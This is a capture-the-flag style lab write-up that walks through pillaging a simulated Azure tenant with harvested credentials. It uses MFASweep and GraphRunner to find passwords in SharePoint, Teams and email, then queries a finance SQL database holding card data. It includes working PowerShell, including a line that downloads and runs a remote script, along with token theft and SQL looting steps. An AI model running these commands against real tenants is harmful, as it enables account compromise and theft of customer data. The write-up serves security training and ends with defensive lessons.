Author: Cody Keppen [LinkedIn Profile](https://www.linkedin.com/in/cody-keppen-a09068355/)

Date: 09/02/2026

---
# Table of Contents
- [Preview of Exercise](#preview-of-exercise)
- [Concepts Demonstrated](#concepts-demonstrated) 
- [Instructional Steps](#instructional-steps)
- [Lessons Learned](#lessons-learned)
- [Summary](#summary)
- [Resources](#resources)

---

# Preview of Exercise

This is a simulation of a threat actor, already in possesion of harvested credentials, enumerating an Azure tenant space.  Using MFSweep for recon to understand which Micrsoft service has MFA enabled. But more importantly, which do not. Meaning, which service only requires the already acquired password as the single form of authentication.

Then using GraphRunner to search for useful information the compromised user has access to. All taking advanted of Microsoft Graph to look through the users Teams, Sharepoint and Outlook messages.

Which leads to the discovery of important documents that contain financial information of customers, a password list and eventually access to a SQL databse.

Lab: [PWNED LABS: Loot Exchange, Teams and SharePoint with GraphRunner](https://app.pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner)

#  Concepts Demonstrated

1. Recon
2. Pillaging
3. Exfiltration
4. Microsoft Graph
5. Azure SQL connection

---
# Instructional Steps

These are the steps taken during this demonstration. There will be links throughout this section to the [Lessons Learned](#lessons-learned) section to notate obstacles and solutions during the demonstration.

Using the stolen credentials for the user `Clara.Miller@bigmegatech.com`, [MFASweeper](https://github.com/dafthack/MFASweep) will attempt to log into multiple services and return which only requires a single sign-on setting. Allowing us to simply use the same password again to gain access.

![](images/Pasted%20image%2020260830224642.png)

After the program runs, you can see from the below list, that Microsoft Graph and Azure Resource Manager (ARM) both only require one form of sign-in for access.

![](images/Pasted%20image%2020260830174637.png)

Now that I see I can connect to Microsoft Graph, I'll use `Connect-MgGraph`, then use the stolen password to authenticate in the login page that popups up.

I do some checks on the users to get an idea of the access the user may have. Using, 

``` Powershell
Get-MgContext
``` 

for basic user information, including scope and, 

``` Powershell
Get-MgUserMemberOf -userid "Clara.Miller@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
``` 

to see what they are a member of.

![](images/Pasted%20image%2020260902131943.png)

Here are all the scopes for the user with,

``` Powershell
Get-MgContext | Select-Object -ExpandProperty Scopes
```

![](images/Pasted%20image%2020260902132912.png)

I can also check their licenses with,

``` Powershell
Get-MgUserLicenseDetail -UserId "Clara.Miller@megabigtech.com"
``` 

Which returns a Microsoft 365 license.

![](images/Pasted%20image%2020260830224954.png)

Now I'll run [GraphRunner](https://github.com/dafthack/GraphRunner) to start searching the data the user has access to with keywords, from the 'Pillage' section.

``` Powershell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
```

![](images/Pasted%20image%2020260830175813.png)

Specifically, `Invoke-SearchSharePointAndOneDrive`, `Invoke-SearchMailbox` and `Invoke-SearchTeams`.

![](images/Pasted%20image%2020260830180403.png)

First, I need to get a token from the user with `Get-GraphTokens`. Which will then save the token in the `$tokens` variable.

![](images/Pasted%20image%2020260830180705.png)
![](images/Pasted%20image%2020260902133635.png)

Now we'll use,

``` Powershell
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"
```

This is to use the token to search through SharePoint and OneDrive for anything that has the keyword of "password".

Which returns two hits. A file named `passwords.xlsx` and `Finance Logins.docx`. As a threat actor, those are some great file name to see.

![](images/Pasted%20image%2020260830221440.png)

I'll use the prompts provided by GraphRunner to act on the results. The first item starts at zero. I'd like the second result, so I provide the answers below. "Y" to download a file. "1" to select the second result for the `Finance Logins.docx` file. Then "No" to end the prompt to review the file.

![](images/Pasted%20image%2020260830222245.png)

Opening the document, success! We have URLs, usernames and passwords.

![](images/Pasted%20image%2020260902134939.png)

I also download the `passwords.xlsx` file.

![](images/Pasted%20image%2020260902135524.png)

![](images/Pasted%20image%2020260902135634.png)

That's two big hits just from searching SharePoint and OneDrive for "password".  Now let's try "bonus".

``` Powershell
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'
```

That's another hit and we now have three files saved. With the newly acquired, `Bonuses - Confidential.xlsx`.

![](images/Pasted%20image%2020260830222411.png)

Though the new "confidential" file also requires a password.

![](images/Pasted%20image%2020260902140132.png)

I looked through the passwords uncovered earlier and didn't find any that would work. Which means we need to continue our search. This time, we'll look through Teams chats with the following, 

``` Powershell
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```

And it looks like we may have a good candidate password to try, `openme123!`. 

![](images/Pasted%20image%2020260830222610.png)

Success! And poor Clara. Sometimes you just have to take the feedback and run with it. I'm sure this is a file the company would not like to be out in the public for their employees.

![](images/Pasted%20image%2020260902140540.png)

Let's continue our search, but this time look through the emails.

``` PowerShell
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```

Here I get an email previous showing login details and a finance server!

![](images/Pasted%20image%2020260830223513.png)

We'll attempt to make a connection to the database with,

```Powershell
$conn = New-Object System.Data.SqlClient.SqlConnection
$password='$reporting$123'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=financereports;Password=$password;"
$conn.Open()
```

Then review the tables within the database,

```Powershell
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables
```

The results show us a 'Subscribers' table in the Finance database.

![](images/Pasted%20image%2020260830224112.png)

Now we'll make a query to the table to see what information resides in here.

```Powershell
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM Subscribers;"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables | ft
```

And what we get is data that no customer will want leaked on the internet. Full credit card numbers, expiration dates, CVV numbers and full names.

![](images/Pasted%20image%2020260830224240.png)

At this point, three documents have been downloaded. Two of which have credentials to login to further accounts. An employee bonus list to show which employees have a heavier bank account. And now multiple credit cards belonging to customers. Time to leave.

```Powershell
$conn.Close ()
```

---
# Lessons Learned

Having tools like MFASweeper and GraphRunner really do make things pretty easy once initial access is established.

A quick sweep to find single sign-on services to use the same password turned into getting further accounts to be accessed in the future, as well as employee and customer data.

Even being able to log into the SQL database became easy once the email was found.

Really, if MFA was established with Microsoft Graph, even with the password in hand, getting access would have been much harder. Once access was established the recon phase allowed for quick enumeration to start spreading through the users data to find these high value targets.

Another factor was the communication channels and files used to discuss and store password. Throughout the exercise, there was only one real roadblock, and that was the Bonuses file being locked down with a password. Which was great, but the password was available in what looked like a password reset chat with the user.

# Summary

MFA is going to be one of the strongest security options that can be configured for users. Having this enabled is going to require that extra step from threat actors to get around that really stops them at the initial attempts to log in.

It's not like MFA is not used. This just happened to be a whole. GraphRunner can provide Conditional Access policy with the following, which shows 40 active policies.

```Powershell
Invoke-DumpCAPS
```

![](images/Pasted%20image%2020260902164136.png)

Also, there is a poor security culture of users saving passwords in files and opening discussing them in emails. There is a plain text password in a Team's chat that was easy to find.

---

# Resources

Lesson: [PWNED LABS: Loot Exchange, Teams and SharePoint with GraphRunner](https://app.pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner)
Tools:
* [MFASweep by Beau Bullock](https://github.com/dafthack/MFASweep)
* [GraphRunner by Beau Bullock](https://github.com/dafthack/GraphRunner)

